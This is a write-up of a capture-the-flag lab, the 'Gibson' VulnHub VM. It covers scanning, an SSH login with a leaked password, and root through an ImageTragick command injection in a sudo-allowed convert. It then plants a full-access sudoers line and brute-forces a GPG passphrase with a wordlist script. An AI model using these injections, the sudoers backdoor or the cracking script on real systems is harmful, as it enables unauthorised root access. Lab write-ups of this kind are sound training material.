Welcome, here we will hack a Gibson; a VM by @knightmare2600. Lets dive right
in.

First we will scan and see what we get.

>```
>sudo nmap -sS -T4 -A 192.168.0.103 -p-
>
>Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-16 12:10 CEST
>Nmap scan report for 192.168.0.103
>Host is up (0.00077s latency).
>Not shown: 65533 closed ports
>PORT   STATE SERVICE VERSION
>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
>| ssh-hostkey:
>|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
>|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
>|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
>80/tcp open  http    Apache httpd 2.4.7
>| http-ls: Volume /
>| SIZE  TIME              FILENAME
>| 273   2016-05-07 13:03  davinci.html
>|_
>|_http-server-header: Apache/2.4.7 (Ubuntu)
>|_http-title: Index of /
>MAC Address: 08:00:27:CC:93:68 (Oracle VirtualBox virtual NIC)
>Device type: general purpose
>Running: Linux 3.X|4.X
>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
>OS details: Linux 3.2 - 4.4
>Network Distance: 1 hop
>Service Info: Host: gibson.example.co.uk; OS: Linux; CPE: cpe:/o:linux:linux_kernel
>
>TRACEROUTE
>HOP RTT     ADDRESS
>1   0.77 ms 192.168.0.103
>
>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
>Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
>```

Pretty normal, we got ssh and a webserver. On the server we find davinci.html:

>```
><html>
><title>Gibson Mining Corporation</title>
><body>
><!-- Damn it Margo! Stop setting your password to "god" -->
><!-- at least try and use a different one of the 4 most -->
><!-- common ones! (eugene) -->
><h1> The answer you seek will be found by brute force</h1>
></body>
>```

I put on some bruteforce, but they all came back empty:

For files:

>```
>wfuzz -Z -A -w /opt/SecLists/Discovery/Web_Content/raft-large-words-lowercase.txt --hc 404,403  192.168.0.103/FUZZ
>********************************************************
>* Wfuzz 2.1 - The Web Bruteforcer                      *
>********************************************************
>
>Target: http://192.168.0.103/FUZZ
>Total requests: 107982
>
>
>==============================================================================================================================================
>ID	C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Request
>==============================================================================================================================================
>
>00321:  0.005s   C=000     15 L	      50 W	    756 Ch                                                  (*) http://192.168.0.103/   "."
>
>Total time: 330.4943
>Processed Requests: 107982
>Filtered Requests: 107981
>Requests/sec.: 326.7287
>```

And for directories:

>```
>wfuzz -Z -A -w /opt/SecLists/Discovery/Web_Content/raft-large-directories-lowercase.txt --hc 404,403  192.168.0.103/FUZZ
>********************************************************
>* Wfuzz 2.1 - The Web Bruteforcer                      *
>********************************************************
>
>Target: http://192.168.0.103/FUZZ
>Total requests: 56180
>
>
>==============================================================================================================================================
>ID	C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Request
>==============================================================================================================================================
>
>>03603:  0.003s   C=200     15 L	      50 W	    756 Ch     Apache/2.4.7 (Ubu                                                        ""
  >>|_ Directory listing identified
  >|_ Plugin links enqueued 3 more requests (rlevel=1)
>07369:  0.008s   C=200     15 L	      50 W	    756 Ch     Apache/2.4.7 (Ubu                                                        ""
>25832:  0.005s   C=200     15 L	      50 W	    756 Ch     Apache/2.4.7 (Ubu                                                        ""
>56149:  0.005s   C=200     15 L	      50 W	    756 Ch     Apache/2.4.7 (Ubu                                                        "/"
>56182:  0.007s   C=200      8 L	      47 W	    273 Ch     Apache/2.4.7 (Ubu                                                        "/davinci.html"
>
>Total time: 174.5430
>Processed Requests: 56183 (56180 + 3)
>Filtered Requests: 56178
>Requests/sec.: 321.8861
>```

Kinda strange how the directory one finds the file, but whatever. After this comes
back empty I try to ssh in as margo with password 'god'.

>```
>ssh margo@192.168.0.103
>Ubuntu 14.04.3 LTS
>margo@192.168.0.103's password:
>Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)
>margo@gibson:~$
>```

Having a shell allows us to do some recon. There are users margo, eugene and
duke. There is nothing in our own home directory but in eugene's we find:

>```
>-rwxrwxr-x 1 eugene eugene 8589 May  5 19:10 spin64
>```

As advertised, it spins. (It's useless)

Lets keep going:

>```
>margo@gibson:~$ sudo -l
>Matching Defaults entries for margo on gibson:
>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
>
>User margo may run the following commands on gibson:
>    (ALL) NOPASSWD: /usr/bin/convert
>```

So this seems pretty obviously the ImageTragick exploit. Convert does not
properly escape commands and so it is vulnerable to cmd injection.

>```
>margo@gibson:/tmp$ sudo convert 'https://example.com";id"' out.png
>uid=0(root) gid=0(root) groups=0(root)
>```

To elevate to uid root I use this command injection to start vim as root:

>```
>margo@gibson:/tmp$ sudo convert 'https://example.com";vim"' out.png
>```

Add the following line to /etc/sudoers

>```
>margo ALL=(ALL) NOPASSWD: ALL
>```

Now we have a root shell:

>```
>margo@gibson:/tmp$ sudo su
>root@gibson:/tmp# id
>uid=0(root) gid=0(root) groups=0(root)
>```

Since knightmare's VMs do not end with root the search for the flag (and the
real fun) begins now. In /etc/sudoers we find the following line:

>```
>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
>```

We can use virt-manager to view a VM running on this VM, but it's over VNC and
very slow to update the screen. I chose to extract the VM image (from the VM).

In ps ax we find the qemu command:

>```
>ps ax
>(output)
>/usr/bin/qemu-system-x86_64 -name ftpserv -S -machine pc-i440fx-trusty,accel=tcg,usb=off -m 256 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid ebcdaa6c-b10a-d758-c13a-0fb296b011f1 -no-user-config
>```

So where is this image?

>```
>root@gibson:~# find / -name ftpserv.img
>/var/lib/libvirt/images/ftpserv.img
>```

After enablign password login over ssh as root, I copy this to my local machine for some sleuthing.

>```
>scp root@192.168.0.103:/var/lib/libvirt/images/ftpserv.img .
>Ubuntu 14.04.3 LTS
>root@192.168.0.103's password:
>ftpserv.img                                100%  512MB  51.2MB/s   00:10
>```

Lets see what kind of image we are dealing with:

>```
>file ftpserv.img                                                                                  ⏎
>ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
>
>fdisk -lu ftpserv.img
>Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
>Units: sectors of 1 * 512 = 512 bytes
>Sector size (logical/physical): 512 bytes / 512 bytes
>I/O size (minimum/optimal): 512 bytes / 512 bytes
>Disklabel type: dos
>Disk identifier: 0x00000000
>
>Device       Boot Start     End Sectors   Size Id Type
>ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)
>```

Using some tools from sleuthkit we can extract files from this image.

>```
>fls -f fat16 -o 63 ftpserv.img                                                                    ⏎
>r/r 3:	KFYLNN      (Volume Label Entry)
>d/d 4:	DOS
>r/r 5:	KERNEL.SYSr/r 6:	AUTOEXEC.BAT
>r/r 7:	COMMAND.COM
>r/r 8:	FDCONFIG.SYS
>r/r 9:	BOOTSECT.BIN
>d/d 11:	net
>d/d 12:	GARBAGE
>r/r * 13:	_WSDPMI.SWP
>v/v 16763907:	$MBR
>v/v 16763908:	$FAT1
>v/v 16763909:	$FAT2
>d/d 16763910:	$OrphanFiles
>```

That GARBAGE directory looks interesting.

>```
>fls -f fat16 -o 63 ftpserv.img 12                                                                 ⏎
>r/r 845574:	jz_ug.ans
>r/r * 845576:	cookies.txt^
>r/r 845578:	adminspo.jpg
>r/r 845580:	flag.img
>r/r * 845582:	cookies.txt^
>```

We can extract the files from it using icat:

>```
>icat -f fat16 -o 63 ftpserv.img 845580 > flag.img
>```

Now we repeat the process for this image :)

>```
>fls -f ext3 -r flag.img                                                                          ⏎
>d/d 11:	lost+found
>r/r * 12(realloc):	flag.txt.gpg
>r/r 13:	davinci
>r/r 14:	davinci.c
>r/r 15:	hint.txt
>d/d 16:	.trash
>+ r/r 12:	flag.txt.gpg
>+ r/r 17:	LeithCentralStation.jpg
>+ r/r * 18:	flag.txt
>r/r * 18:	.hint.txt.swp
>r/r * 19:	.hint.txt.swx
>d/d 97:	$OrphanFiles
>```

The davinci files are just a snake game, presumably so we cant just run strings
on flag.img :), the hint.txt is:

>```
>http://www.imdb.com/title/tt0117951/ and
>http://www.imdb.com/title/tt0113243/ have
>someone in common... Can you remember his
>original nom de plume in 1988...?
>```

Which refers to the actor jonnny lee miller (that's a good one for trivia
night), who in the movie hackers went by the name "zero cool".

Unfortunately "zero cool" doesnt decrypt flag.txt.gpg. So I made a wordlist:

starting with

>```
>zerokool
>zerocool
>zero Cool
>zero Kool
>```

We make a wordlist by first getting all combinations of caps with --rules=nt and
then we get all the l33t forms of these words with --rules=KoreLogicRulesL33t:

>```
>/opt/JohnTheRipper/run/john --rules=nt --wordlist=passwords --stdout > passwords1
>/opt/JohnTheRipper/run/john --rules=KoreLogicRulesL33t --wordlist=passwords1 --stdout > passwords2
>```

Now we try all these words as password with the following script:

>```
>#!/bin/bash
>#
>
># try all word in words.txt
>for word in $(cat passwords3); do
>
>  # try to decrypt with word
>  echo "${word}" | gpg --passphrase-fd 0 -q --batch --allow-multiple-messages --no-tty --output flag --decrypt flag.txt.gpg;
>
>  # if decrypt is successfull; stop
>  if [ $? -eq 0 ]; then
>
>    echo "GPG passphrase is: ${word}";
>    exit 0;
>
>  fi
>
>done;
>
>exit 1;
>```

Save as brute.sh and...

>```
>./brute.sh
>gpg: decryption failed: Bad session key
><whole lot of times....>
>gpg: decryption failed: Bad session key
>gpg: WARNING: message was not integrity protected
>GPG passphrase is: Z3r0K00l
>```

w00t w00t!

>```
>cat flag
> _   _            _      _____ _             ____  _                  _   _
>| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
>| |_| |/ _` |/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _` | '_ \ / _ \ __| |
>|  _  | (_| | (__|   <    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
>|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)
>
>
>Should you not be standing in a 360 degree rotating payphone when reading
>this flag...? B-)
>
>Anyhow, congratulations once more on rooting this VM. This time things were
>a bit esoteric, but I hope you enjoyed it all the same.
>
>Shout-outs again to #vulnhub for hosting a great learning tool. A special
>thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
>to host the CTF once more.
>                                                              --Knightmare
>```

This was a fun VM, if you run it definiately take a look at the
VM-within-the-VM which was a nice twist! Much thanks again to @knightmare2600
for the challenge
